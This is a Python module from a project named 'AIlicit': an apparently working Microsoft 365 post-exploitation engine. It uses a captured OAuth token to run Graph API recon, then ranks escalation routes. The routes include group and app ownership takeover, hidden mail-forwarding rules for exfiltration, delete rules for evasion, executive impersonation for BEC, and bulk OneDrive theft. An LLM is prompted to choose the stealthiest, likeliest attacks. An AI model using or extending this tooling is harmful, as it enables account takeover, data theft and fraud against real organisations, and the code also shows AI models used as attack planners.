#!/usr/bin/env python3
"""
privesc.py - M365 Privilege Escalation Engine

Three-layer architecture:
1. Deterministic permission graph (edge table + recon data)
   -> Edge expansion produces all candidate escalation paths (JSON).
2. Foundation-Sec-8B reasoning layer (OpenAI-compatible / Ollama endpoint).
   Fallback chain: Foundation-Sec-8B -> Groq Llama-3.3-70b -> deterministic
   score-based selection.
3. Top-3 path ranking with PRIVESC probability percentages.

Pipeline:
    Recon Data (OAuth scopes + parallel_recon results)
        -> Graph Engine (Edge Expansion)
        -> Candidate Paths (JSON)
        -> Foundation-Sec-8B (Path Selection + Reasoning)
        -> Top 3 Selected Paths with PRIVESC probability (JSON)

Integration with postexp.py:
    from .privesc import run_privesc
    result = run_privesc(token_mgr, recon_data)
    # result["top_3_paths"] == list of 3 RankedPath dicts w/ probability_percent

Project: AIlicit
"""

import os
import sys
import json
import base64
import logging
import re
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Any
from datetime import datetime

import requests

from .constants import (
    SEC_API_KEY, SEC_BASE_URL, SEC_MODEL,
    GROQ_API_KEY, GROQ_ENDPOINT, MAVERICK_MODEL,
)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

GRAPH_BASE = "https://graph.microsoft.com/v1.0"


# ============================================================
# DATA CLASSES
# ============================================================

@dataclass
class EscalationEdge:
    """A deterministic escalation path edge."""
    path_id: str
    name: str
    description: str
    required_scopes: List[str]
    prereq_objects: List[str]
    action: str
    gain: str
    confidence: float
    stealth_score: float
    reversibility: bool
    graph_call: str
    preconditions: Dict[str, Any]


@dataclass
class ReconData:
    """Reconnaissance data from OAuth scopes + parallel_recon."""
    granted_scopes: List[str]
    user: Dict[str, Any]
    groups: List[Dict[str, Any]]
    applications: List[Dict[str, Any]]
    mail_rules: List[Dict[str, Any]]
    contacts: List[Dict[str, Any]]
    misconfigs: List[Dict[str, Any]]
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class RankedPath:
    """A ranked attack path with probability."""
    path_id: str
    name: str
    description: str
    steps: List[str]
    probability: float  # 0.0-1.0
    impact: str
    stealth_score: float
    time_estimate: str
    narrative: str
    reasoning: str
    source: str = "deterministic"  # which layer picked it


# ============================================================
# RECON HELPERS
# ============================================================

def _decode_jwt(token: str) -> Dict[str, Any]:
    """Decode (unverified) JWT payload of an access token."""
    try:
        parts = (token or "").split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def scopes_from_token(token: str) -> List[str]:
    """Extract granted OAuth scopes from the access token JWT."""
    try:
        scope_claim = _decode_jwt(token).get("scope", "") or ""
        return [s.strip() for s in scope_claim.split() if s.strip()]
    except Exception:
        return []


def _values(d: Any) -> List[Dict[str, Any]]:
    """Extract the 'value' list from a Graph API response dict (safe)."""
    if isinstance(d, dict):
        v = d.get("value")
        if isinstance(v, list):
            return [x for x in v if isinstance(x, dict)]
    if isinstance(d, list):
        return [x for x in d if isinstance(x, dict)]
    return []


def _graph_get(token_mgr, endpoint: str, timeout: int = 20) -> Dict[str, Any]:
    """GET a Graph endpoint with a single 401-refresh retry. Never raises."""
    try:
        if token_mgr is None or not token_mgr.ensure_valid_token():
            return {}
        resp = requests.get(
            GRAPH_BASE + endpoint,
            headers=token_mgr.get_headers(),
            timeout=timeout,
        )
        if resp.status_code == 401 and token_mgr.refresh_access_token():
            resp = requests.get(
                GRAPH_BASE + endpoint,
                headers=token_mgr.get_headers(),
                timeout=timeout,
            )
        if resp.status_code == 200:
            data = resp.json()
            return data if isinstance(data, dict) else {}
        logger.debug("Graph GET %s -> %s", endpoint, resp.status_code)
    except Exception as e:
        logger.debug("Graph GET %s failed: %s", endpoint, e)
    return {}


def _detect_misconfigs(recon: "ReconData") -> List[Dict[str, Any]]:
    """Deterministic misconfiguration detection over recon data."""
    findings: List[Dict[str, Any]] = []

    for rule in recon.mail_rules:
        # rule shape: {isEnabled, actions: {forwardTo, delete, copyTo}, ...}
        actions = rule.get("actions") or {}
        is_hidden = rule.get("isHidden", False)
        forward_to = actions.get("forwardTo") or []
        for addr in forward_to:
            email = addr.get("emailAddress", {}).get("address", "") if isinstance(addr, dict) else str(addr)
            findings.append({
                "type": "hidden_forwarding" if is_hidden else "forwarding_rule",
                "description": f"Mail rule forwards to {email or 'unknown'}",
                "severity": "high" if is_hidden else "medium",
            })
        if actions.get("delete") and is_hidden:
            findings.append({
                "type": "silent_delete_rule",
                "description": "Hidden rule silently deletes inbound messages",
                "severity": "high",
            })
        if actions.get("copyTo") and is_hidden:
            findings.append({
                "type": "silent_copy_rule",
                "description": "Hidden rule copies inbound messages (shadow mailbox)",
                "severity": "medium",
            })

    for grp in recon.groups:
        name = (grp.get("displayName") or "").lower()
        if any(k in name for k in ("admin", "domain", "exchange", "azure ad")):
            findings.append({
                "type": "privileged_group_membership",
                "description": f"User is member of privileged group: {grp.get('displayName')}",
                "severity": "high",
            })

    for app in recon.applications:
        sp_type = app.get("servicePrincipalType", "Application")
        if sp_type == "Application":
            findings.append({
                "type": "enterprise_application",
                "description": f"Enterprise application present: {app.get('displayName', 'unknown')}",
                "severity": "medium",
            })

    return findings


# ============================================================
# DETERMINISTIC EDGE EXPANDER (M365 ESCALATION GRAPH)
# ============================================================

class EdgeExpander:
    """Expands all possible M365 escalation edges from recon data."""

    # Deterministic M365 escalation edge table
    EDGE_TABLE: List[Dict[str, Any]] = [
        {
            "id": "edge_group_ownership",
            "name": "Group Ownership Escalation",
            "desc": "Take ownership of a writable group, then join a role-assignment (Privileged Role Admin / Domain Admins) group",
            "scopes": ["Directory.ReadWrite.All"],
            "gain": "Domain Admin",
            "impact": 1.0,
            "confidence": 0.85,
            "stealth": 0.55,
            "reversible": True,
            "time": "5-10 minutes",
            "graph_call": "PUT /groups/{group_id}/owners/$ref/{user_id}",
            "requires_obj": "groups",
        },
        {
            "id": "edge_app_ownership",
            "name": "Application Ownership Escalation",
            "desc": "Take ownership of an enterprise application and re-point its app roles / client secret",
            "scopes": ["Application.ReadWrite.All"],
            "gain": "App Admin",
            "impact": 0.85,
            "confidence": 0.8,
            "stealth": 0.7,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "PUT /servicePrincipals/{sp_id}/owners/$ref/{user_id}",
            "requires_obj": "applications",
        },
        {
            "id": "edge_app_role_grant",
            "name": "Application Role Grant",
            "desc": "Create an app role assignment granting a controllable app a privileged API role (Directory.ReadWrite.All)",
            "scopes": ["Application.ReadWrite.All"],
            "gain": "App Role -> Directory Write",
            "impact": 0.8,
            "confidence": 0.7,
            "stealth": 0.5,
            "reversible": True,
            "time": "3-5 minutes",
            "graph_call": "POST /appRoleAssignments",
            "requires_obj": "applications",
        },
        {
            "id": "edge_guest_invite",
            "name": "Guest User Invitation",
            "desc": "Invite an external guest user and (via a writable group) promote them to a privileged role",
            "scopes": ["Directory.ReadWrite.All"],
            "gain": "Guest Admin access",
            "impact": 0.7,
            "confidence": 0.65,
            "stealth": 0.45,
            "reversible": True,
            "time": "5-8 minutes",
            "graph_call": "POST /invitations",
            "requires_obj": None,
        },
        {
            "id": "edge_mail_forwarding",
            "name": "Mail Forwarding Rule (Persistence + Exfiltration)",
            "desc": "Create a hidden inbox forwarding rule to an external account for persistence and exfil",
            "scopes": ["Mail.ReadWrite"],
            "gain": "Persistence + Email Exfiltration",
            "impact": 0.6,
            "confidence": 0.9,
            "stealth": 0.4,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "POST /me/mailFolders/inbox/messageRules",
            "requires_obj": None,
        },
        {
            "id": "edge_silent_delete",
            "name": "Hidden Delete/Copy Rule",
            "desc": "Create a hidden rule that silently deletes or copies mail (detection evasion / shadow mailbox)",
            "scopes": ["Mail.ReadWrite"],
            "gain": "Detection Evasion",
            "impact": 0.55,
            "confidence": 0.85,
            "stealth": 0.85,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "POST /me/mailFolders/inbox/messageRules",
            "requires_obj": None,
        },
        {
            "id": "edge_contact_impersonation",
            "name": "External Contact Impersonation",
            "desc": "Create a mail contact matching an internal executive; replies to the victim land in attacker-controlled flow",
            "scopes": ["Contacts.ReadWrite"],
            "gain": "Reply spoof / BEC amplification",
            "impact": 0.55,
            "confidence": 0.6,
            "stealth": 0.65,
            "reversible": True,
            "time": "2-3 minutes",
            "graph_call": "POST /me/contacts",
            "requires_obj": "contacts",
        },
        {
            "id": "edge_calendar_hijack",
            "name": "Calendar / Meeting Hijack",
            "desc": "Read + write the victim's calendar; hijack a scheduled meeting thread to inject BEC messages",
            "scopes": ["Calendars.ReadWrite"],
            "gain": "Context hijack for BEC",
            "impact": 0.45,
            "confidence": 0.75,
            "stealth": 0.6,
            "reversible": True,
            "time": "2-4 minutes",
            "graph_call": "GET /me/calendarView / PUT /me/events/{id}",
            "requires_obj": None,
        },
        {
            "id": "edge_one_drive_exfil",
            "name": "OneDrive File Exfiltration",
            "desc": "Stream tenant files out via Files.ReadWrite.All (data hoarding to amplify later privesc)",
            "scopes": ["Files.ReadWrite.All"],
            "gain": "Bulk Data Access",
            "impact": 0.45,
            "confidence": 0.85,
            "stealth": 0.35,
            "reversible": False,
            "time": "5-15 minutes",
            "graph_call": "GET /me/drive/root:/{path}/content",
            "requires_obj": None,
        },
        {
            "id": "edge_verified_domains",
            "name": "Verified Domain Enumeration",
            "desc": "Enumerate org verified domains to surface additional phishable / mergeable tenant domains",
            "scopes": ["Directory.Read.All"],
            "gain": "Tenant Surface Expansion",
            "impact": 0.4,
            "confidence": 0.9,
            "stealth": 0.9,
            "reversible": True,
            "time": "1-2 minutes",
            "graph_call": "GET /organization",
            "requires_obj": None,
        },
    ]

    def __init__(self, recon_data: ReconData):
        self.recon = recon_data
        self.edges: List[EscalationEdge] = []

    # ----------------------------------------------------------
    def expand(self) -> List[EscalationEdge]:
        """Expand all possible edges based on recon data. Deterministic."""
        self.edges = []
        for edge_def in self.EDGE_TABLE:
            if not self._scopes_satisfied(edge_def["scopes"]):
                continue
            obj_key = edge_def.get("requires_obj")
            if obj_key is not None:
                objects = getattr(self.recon, obj_key, []) or []
                if not objects:
                    continue
            # Confidence boost from supporting misconfigurations
            boost = self._recon_boost(edge_def)
            confidence = min(0.98, edge_def["confidence"] + boost)

            obj_key = edge_def.get("requires_obj")
            if obj_key == "groups":
                self._expand_per_object(edge_def, self.recon.groups, "group_id", confidence)
            elif obj_key == "applications":
                self._expand_per_object(edge_def, self.recon.applications, "sp_id", confidence)
            elif obj_key == "contacts":
                self._expand_generic(edge_def, confidence)  # one path, targets built at exec time
            else:
                self._expand_generic(edge_def, confidence)
        return self.edges

    # ----------------------------------------------------------
    def _scopes_satisfied(self, required: List[str]) -> bool:
        """True if every required scope is granted (base scope counts as grant of its .ReadWrite.All too)."""
        granted = [s for s in self.recon.granted_scopes if s]
        def has(scope: str) -> bool:
            if scope in granted:
                return True
            # .ReadWrite implies .Read
            base, _, variant = scope.rpartition(".")
            if variant == "ReadWrite" and base:
                if f"{base}.ReadWrite.All" in granted:
                    return True
            if variant in ("Read", "ReadWrite") and base:
                if f"{base}.ReadWrite.All" in granted:
                    return True
            return False
        return all(has(s) for s in required)

    def _recon_boost(self, edge_def: Dict) -> float:
        """Deterministic confidence boost from observed misconfigs."""
        boost = 0.0
        types = {m.get("type") for m in self.recon.misconfigs}
        if edge_def["id"] == "edge_group_ownership" and "privileged_group_membership" in types:
            boost += 0.08
        if edge_def["id"] in ("edge_mail_forwarding", "edge_silent_delete") and (
            "hidden_forwarding" in types or "forwarding_rule" in types
        ):
            boost += 0.05
        if edge_def["id"] == "edge_app_ownership" and "enterprise_application" in types:
            boost += 0.05
        if self.recon.granted_scopes and len(self.recon.granted_scopes) >= 5:
            boost += 0.02  # broad token footprint
        return boost

    def _expand_per_object(self, edge_def: Dict, objects: List[Dict], obj_id_key: str, confidence: float):
        for obj in objects:
            obj_id = obj.get("id", "unknown")
            name = obj.get("displayName") or obj.get("mailNickname") or obj.get("appDisplayName") or "unknown"
            if edge_def["id"] == "edge_group_ownership" and (obj.get("is_owner") or not name):
                continue  # already owner or unusable
            if edge_def["id"] == "edge_app_ownership" and obj.get("is_owner"):
                continue
            call = edge_def["graph_call"].replace("{" + obj_id_key + "}", obj_id)
            self.edges.append(EscalationEdge(
                path_id=f"{edge_def['id']}::{obj_id}",
                name=edge_def["name"],
                description=f"{edge_def['desc']} - Target: {name}",
                required_scopes=list(edge_def["scopes"]),
                prereq_objects=[obj_id],
                action=f"Escalate via {name}",
                gain=edge_def["gain"],
                confidence=confidence,
                stealth_score=edge_def["stealth"],
                reversibility=edge_def["reversible"],
                graph_call=call,
                preconditions={obj_id_key: obj_id, "object_name": name},
            ))

    def _expand_generic(self, edge_def: Dict, confidence: float):
        self.edges.append(EscalationEdge(
            path_id=edge_def["id"],
            name=edge_def["name"],
            description=edge_def["desc"],
            required_scopes=list(edge_def["scopes"]),
            prereq_objects=[],
            action=edge_def["name"],
            gain=edge_def["gain"],
            confidence=confidence,
            stealth_score=edge_def["stealth"],
            reversibility=edge_def["reversible"],
            graph_call=edge_def["graph_call"],
            preconditions={},
        ))


# ============================================================
# FOUNDATION-SEC-8B REASONING LAYER
# ============================================================

class Sec8BReasoner:
    """Path-selection reasoning layer.

    Backend chain:
      1. Foundation-Sec-8B   (OpenAI-compatible endpoint, e.g. Ollama)
      2. Groq Llama-3.3-70b  (MAVERICK_MODEL)
      3. Deterministic score-based selection (always available)
    """

    SYSTEM_PROMPT = (
        "You are Foundation-Sec-8B, a security analyst specialising in Microsoft 365 "
        "identity attacks. You receive deterministic escalation candidate paths with "
        "recon context. You select the TOP 3 most probable privilege-escalation paths, "
        "assign each a probability percentage, and explain your reasoning."
    )

    def __init__(self):
        self.sec_url = (SEC_BASE_URL or "").rstrip("/") + "/chat/completions"

    # ----------------------------------------------------------
    def select_paths(self, edges: List[EscalationEdge], recon_data: ReconData) -> List[RankedPath]:
        """Select and rank top 3 escalation paths."""
        if not edges:
            return []

        deterministic = self._fallback_selection(edges)
        deterministic_ids = {p.path_id for p in deterministic}
        deterministic_map = {p.path_id: p for p in deterministic}

        candidates = self._build_candidates(edges, recon_data)
        prompt = self._build_prompt(candidates, recon_data)

        response = self._call_sec8b(prompt) or self._call_groq(prompt)
        if not response:
            return deterministic

        parsed = self._parse_response(response, edges)
        if not parsed:
            return deterministic

        # Keep only paths grounded in the deterministic edge set
        grounded: List[RankedPath] = []
        for p in parsed:
            if p.path_id not in deterministic_ids:
                # try fuzzy match by base id
                base = p.path_id.split("::")[0]
                match = next(
                    (e for e in edges if e.path_id == base or e.path_id.startswith(base + "::")),
                    None,
                )
                if match:
                    p.path_id = match.path_id
                else:
                    continue
            if p.path_id in deterministic_map:
                p.source = "foundation-sec-8b"
                grounded.append(p)

        if not grounded:
            return deterministic

        # Top up to 3 using deterministic order if AI returned fewer
        for p in deterministic:
            if len(grounded) >= 3:
                break
            if p.path_id not in {g.path_id for g in grounded}:
                grounded.append(p)

        grounded.sort(key=lambda p: p.probability, reverse=True)
        return grounded[:3]

    # ----------------------------------------------------------
    def _build_candidates(self, edges: List[EscalationEdge], recon_data: ReconData) -> str:
        compact = []
        for e in edges:
            compact.append({
                "path_id": e.path_id,
                "name": e.name,
                "description": e.description,
                "required_scopes": e.required_scopes,
                "gain": e.gain,
                "confidence": round(e.confidence, 3),
                "stealth_score": round(e.stealth_score, 3),
                "graph_call": e.graph_call,
            })
        return json.dumps(compact, indent=2)

    def _build_prompt(self, candidates_json: str, recon_data: ReconData) -> str:
        user_upn = (recon_data.user or {}).get("userPrincipalName", "unknown")
        recon_summary = {
            "user": user_upn,
            "granted_scopes": recon_data.granted_scopes,
            "groups": [g.get("displayName") for g in recon_data.groups[:15]],
            "applications": [a.get("displayName") for a in recon_data.applications[:15]],
            "mail_rules": len(recon_data.mail_rules),
            "contacts": len(recon_data.contacts),
            "misconfigs": recon_data.misconfigs[:10],
        }
        return (
            "RECON CONTEXT (JSON):\n"
            + json.dumps(recon_summary, indent=2)
            + "\n\nCANDIDATE ESCALATION PATHS (JSON):\n"
            + candidates_json
            + "\n\nSELECTION CRITERIA (in priority order):\n"
            "1. Likelihood the path succeeds given granted scopes and observed state (confidence)\n"
            "2. Impact of the privilege gained (Domain Admin > App Admin > persistence/evasion)\n"
            "3. Stealth / detectability\n\n"
            "Return ONLY valid JSON, no markdown, in exactly this shape:\n"
            '{"top_paths": [{"path_id": "<exact path_id from candidates>", '
            '"steps": ["step 1", "step 2", "step 3"], '
            '"probability": 0.87, '
            '"narrative": "1-2 sentence human readable description of the route", '
            '"reasoning": "2-3 sentences on why this route is probable in THIS environment"}]}\n'
            "probability must be a float between 0.0 and 1.0."
        )

    # ----------------------------------------------------------
    def _call_sec8b(self, prompt: str) -> Optional[str]:
        if not (SEC_API_KEY or SEC_BASE_URL):
            return None
        headers = {"Content-Type": "application/json"}
        if SEC_API_KEY:
            headers["Authorization"] = f"Bearer {SEC_API_KEY}"
        payload = {
            "model": SEC_MODEL,
            "messages": [
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 1200,
        }
        try:
            resp = requests.post(self.sec_url, json=payload, headers=headers, timeout=90)
            if resp.status_code != 200:
                logger.info("[Sec-8B] HTTP %s: %s", resp.status_code, resp.text[:200])
                return None
            return resp.json()["choices"][0]["message"]["content"]
        except Exception as e:
            logger.info("[Sec-8B] unavailable (%s) - falling back", e)
            return None

    def _call_groq(self, prompt: str) -> Optional[str]:
        if not GROQ_API_KEY:
            return None
        headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
        payload = {
            "model": MAVERICK_MODEL,
            "messages": [
                {"role": "system", "content": self.SYSTEM_PROMPT},
                {"role": "user", "content": prompt},
            ],
            "temperature": 0.2,
            "max_tokens": 1200,
            "response_format": {"type": "json_object"},
        }
        try:
            resp = requests.post(GROQ_ENDPOINT, json=payload, headers=headers, timeout=60)
            if resp.status_code != 200:
                logger.info("[Groq] HTTP %s: %s", resp.status_code, resp.text[:200])
                return None
            return resp.json()["choices"][0]["message"]["content"]
        except Exception as e:
            logger.info("[Groq] unavailable (%s) - using deterministic selection", e)
            return None

    # ----------------------------------------------------------
    def _parse_response(self, response: str, edges: List[EscalationEdge]) -> List[RankedPath]:
        """Robustly parse model JSON into RankedPath objects (may be partial)."""
        text = (response or "").strip()
        # strip markdown fences if present
        text = re.sub(r"^```(?:json)?\s*", "", text)
        text = re.sub(r"\s*```$", "", text)
        # isolate outermost JSON object
        start, end = text.find("{"), text.rfind("}")
        if start == -1 or end == -1 or end <= start:
            return []
        try:
            data = json.loads(text[start:end + 1])
        except json.JSONDecodeError:
            return []

        edge_map = {e.path_id: e for e in edges}
        out: List[RankedPath] = []
        for item in data.get("top_paths", [])[:3]:
            if not isinstance(item, dict):
                continue
            pid = item.get("path_id")
            edge = edge_map.get(pid)
            if not edge:
                continue
            try:
                prob = min(1.0, max(0.0, float(item.get("probability", edge.confidence))))
            except (TypeError, ValueError):
                prob = edge.confidence
            steps = item.get("steps") or [edge.action]
            if not isinstance(steps, list):
                steps = [str(steps)]
            out.append(RankedPath(
                path_id=edge.path_id,
                name=edge.name,
                description=item.get("description") or edge.description,
                steps=[str(s) for s in steps],
                probability=prob,
                impact=edge.gain,
                stealth_score=edge.stealth_score,
                time_estimate=item.get("time_estimate", "2-5 minutes"),
                narrative=item.get("narrative") or edge.description,
                reasoning=item.get("reasoning") or "Selected by AI reasoning layer.",
                source="foundation-sec-8b",
            ))
        return out

    # ----------------------------------------------------------
    def _fallback_selection(self, edges: List[EscalationEdge]) -> List[RankedPath]:
        """Deterministic fallback: score = w_conf*confidence + w_impact*impact + w_stealth*stealth."""
        scored = []
        for e in edges:
            impact = self._edge_def(e).get("impact", 0.5)
            score = 0.5 * e.confidence + 0.3 * impact + 0.2 * e.stealth_score
            scored.append((score, e))
        scored.sort(key=lambda x: x[0], reverse=True)

        out = []
        for score, e in scored[:3]:
            prob = min(0.95, max(0.35, score))  # clamp to a sane probability band
            out.append(RankedPath(
                path_id=e.path_id,
                name=e.name,
                description=e.description,
                steps=self._default_steps(e),
                probability=prob,
                impact=e.gain,
                stealth_score=e.stealth_score,
                time_estimate=self._edge_def(e).get("time", "2-5 minutes"),
                narrative=f"{e.name}: {e.description}",
                reasoning=(
                    f"Deterministic score 0.{int(score*100):02d} = 0.5*confidence"
                    f"({e.confidence:.2f}) + 0.3*impact + 0.2*stealth({e.stealth_score:.2f}). "
                    f"Requires scopes: {', '.join(e.required_scopes)}."
                ),
                source="deterministic",
            ))
        return out

    def _edge_def(self, edge: EscalationEdge) -> Dict[str, Any]:
        base = edge.path_id.split("::")[0]
        return next((d for d in EdgeExpander.EDGE_TABLE if d["id"] == base), {})

    def _default_steps(self, edge: EscalationEdge) -> List[str]:
        scope_step = "Verify granted scope: " + ", ".join(edge.required_scopes)
        return [scope_step, edge.action, edge.graph_call]


# ============================================================
# MAIN ORCHESTRATOR
# ============================================================

class PrivilegeEscalationEngine:
    """Orchestrates: recon -> edge expansion -> Sec-8B selection -> top 3 JSON."""

    def __init__(self, token_mgr=None):
        self.token_mgr = token_mgr
        self.recon_data: Optional[ReconData] = None
        self.edges: List[EscalationEdge] = []
        self.ranked_paths: List[RankedPath] = []

    # ----------------------------------------------------------
    def build_recon_from_parallel(self, recon_data: Dict[str, Any]) -> ReconData:
        """Build ReconData from a parallel_recon() dict + token JWT scopes.

        recon_data keys (from postexp.parallel_recon):
          inbox_rules, contacts, events, sent_items, mail_folders,
          manager, direct_reports, organization
        Optional extras (passed by caller): granted_scopes, user, groups, applications.
        """
        recon_data = recon_data or {}

        granted_scopes = recon_data.get("granted_scopes") or []
        if not granted_scopes:
            granted_scopes = scopes_from_token(self.token_mgr.access_token if self.token_mgr else None)

        user = recon_data.get("user")
        if not user:
            user = _graph_get(self.token_mgr, "/me") or {}

        groups = recon_data.get("groups")
        if groups is None:
            raw = _graph_get(self.token_mgr, "/me/memberOf")
            groups = [
                {
                    "id": g.get("id"),
                    "displayName": g.get("displayName") or g.get("mailNickname", ""),
                    "is_owner": False,
                }
                for g in _values(raw)
            ]

        applications = recon_data.get("applications")
        if applications is None:
            raw = _graph_get(self.token_mgr, "/servicePrincipals?$top=100&$select=id,displayName,servicePrincipalType")
            applications = [
                {
                    "id": s.get("id"),
                    "displayName": s.get("displayName", ""),
                    "servicePrincipalType": s.get("servicePrincipalType", "Application"),
                    "is_owner": False,
                }
                for s in _values(raw)
            ]

        mail_rules = _values(recon_data.get("inbox_rules"))
        contacts = _values(recon_data.get("contacts"))

        recon = ReconData(
            granted_scopes=granted_scopes,
            user=user,
            groups=groups,
            applications=applications,
            mail_rules=mail_rules,
            contacts=contacts,
            misconfigs=[],
        )
        recon.misconfigs = _detect_misconfigs(recon)
        return recon

    # ----------------------------------------------------------
    def run(self, recon_data: Optional[ReconData] = None) -> Dict:
        """Run the complete privilege escalation pipeline. Returns JSON-serialisable dict."""
        logger.info("=" * 60)
        logger.info("PRIVILEGE ESCALATION ENGINE STARTING")
        logger.info("=" * 60)

        # Phase 1: Recon
        logger.info("[PHASE 1] RECON DATA")
        self.recon_data = recon_data
        logger.info("[+] Granted scopes: %s", self.recon_data.granted_scopes or "(none)")
        logger.info("[+] Groups: %d | Applications: %d | Mail rules: %d | Misconfigs: %d",
                    len(self.recon_data.groups), len(self.recon_data.applications),
                    len(self.recon_data.mail_rules), len(self.recon_data.misconfigs))

        # Phase 2: Deterministic edge expansion
        logger.info("[PHASE 2] DETERMINISTIC EDGE EXPANSION")
        expander = EdgeExpander(self.recon_data)
        self.edges = expander.expand()
        candidate_paths_json = json.dumps([asdict(e) for e in self.edges], indent=2)
        logger.info("[+] %d candidate escalation paths", len(self.edges))

        if not self.edges:
            logger.error("[-] No candidate paths (check granted scopes)")
            return {
                "status": "failed",
                "reason": "no_candidate_paths",
                "granted_scopes": self.recon_data.granted_scopes,
                "total_candidate_paths": 0,
                "candidate_paths": [],
                "top_3_paths": [],
            }

        # Phase 3: Foundation-Sec-8B selection (with fallbacks)
        logger.info("[PHASE 3] PATH SELECTION (Foundation-Sec-8B)")
        reasoner = Sec8BReasoner()
        self.ranked_paths = reasoner.select_paths(self.edges, self.recon_data)
        logger.info("[+] Top %d paths selected (source: %s)",
                    len(self.ranked_paths),
                    self.ranked_paths[0].source if self.ranked_paths else "none")
        for idx, p in enumerate(self.ranked_paths, 1):
            logger.info("    [%d] %s - %.1f%%", idx, p.name, p.probability * 100)

        # Phase 4: Summary JSON
        logger.info("=" * 60)
        logger.info("ESCALATION ANALYSIS COMPLETE")
        logger.info("=" * 60)

        top3 = []
        for p in self.ranked_paths:
            d = asdict(p)
            d["probability_percent"] = round(p.probability * 100, 1)
            top3.append(d)

        return {
            "status": "success",
            "engine": "deterministic-m365-graph + foundation-sec-8b",
            "recon": {
                "granted_scopes": self.recon_data.granted_scopes,
                "user": self.recon_data.user.get("userPrincipalName") if self.recon_data.user else None,
                "groups_found": len(self.recon_data.groups),
                "applications_found": len(self.recon_data.applications),
                "mail_rules": len(self.recon_data.mail_rules),
                "misconfigs": self.recon_data.misconfigs,
            },
            "total_candidate_paths": len(self.edges),
            "candidate_paths_json": candidate_paths_json,
            "top_3_paths": top3,
            "timestamp": datetime.now().isoformat(),
        }


# ============================================================
# INTEGRATION WITH POSTEXP.PY
# ============================================================

def run_privesc(token_mgr, recon_data: Dict) -> Dict:
    """
    Integration point for postexp.py.

    Args:
        token_mgr:   TokenManager instance from postexp.py
        recon_data:  Dict returned by postexp.parallel_recon(token_mgr)
                     (inbox_rules, contacts, events, sent_items, mail_folders,
                      manager, direct_reports, organization)

    Returns:
        Dict with keys: status, total_candidate_paths, candidate_paths_json,
        top_3_paths (list of 3 ranked paths incl. probability_percent).
    """
    try:
        engine = PrivilegeEscalationEngine(token_mgr=token_mgr)
        recon = engine.build_recon_from_parallel(recon_data or {})
        return engine.run(recon_data=recon)
    except Exception as e:
        logger.exception("run_privesc failed")
        return {
            "status": "error",
            "reason": str(e),
            "total_candidate_paths": 0,
            "candidate_paths_json": "[]",
            "top_3_paths": [],
        }


# ============================================================
# COMMAND-LINE ENTRY POINT
# ============================================================

def _demo_recon() -> ReconData:
    """Demo recon for standalone execution (no live token needed)."""
    recon = ReconData(
        granted_scopes=[
            "Mail.Read", "Mail.ReadWrite", "offline_access", "User.Read",
            "Application.ReadWrite.All", "Directory.ReadWrite.All",
            "Mail.Send", "Calendars.ReadWrite", "Contacts.ReadWrite",
            "Files.ReadWrite.All",
        ],
        user={
            "id": "user-001",
            "userPrincipalName": "security@contoso.com",
            "displayName": "Security User",
        },
        groups=[
            {"id": "group-001", "displayName": "Admin-SG-01", "is_owner": False},
            {"id": "group-002", "displayName": "Domain Admins", "is_owner": False},
        ],
        applications=[
            {"id": "app-001", "displayName": "Contoso-Admin-App",
             "servicePrincipalType": "Application", "is_owner": False},
        ],
        mail_rules=[
            {"isEnabled": True, "isHidden": True,
             "actions": {"forwardTo": [{"emailAddress": {"address": "attacker@demo.com"}}]}},
        ],
        contacts=[{"id": "c1", "displayName": "Finance Dept", "emailAddresses": ["finance@contoso.com"]}],
        misconfigs=[],
    )
    recon.misconfigs = _detect_misconfigs(recon)
    return recon


def main():
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except (AttributeError, ValueError):
            pass

    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║        PRIVILEGE ESCALATION ENGINE - AIlicit                  ║
    ║        Deterministic Graph + Foundation-Sec-8B · Top 3        ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    engine = PrivilegeEscalationEngine()
    result = engine.run(recon_data=_demo_recon())

    print("\n" + json.dumps(result, indent=2))

    print("\n" + "=" * 60)
    print("TOP 3 PRIVESC PATHS")
    print("=" * 60)
    for idx, path in enumerate(result.get("top_3_paths", []), 1):
        print(f"\n[{idx}] {path['name']}")
        print(f"    Probability: {path['probability_percent']}%")
        print(f"    Impact:      {path['impact']}")
        print(f"    Steps:       {' -> '.join(path['steps'])}")
        print(f"    Reasoning:   {path['reasoning']}")
        print(f"    Narrative:   {path['narrative']}")
        print(f"    Source:      {path['source']}")


if __name__ == "__main__":
    main()
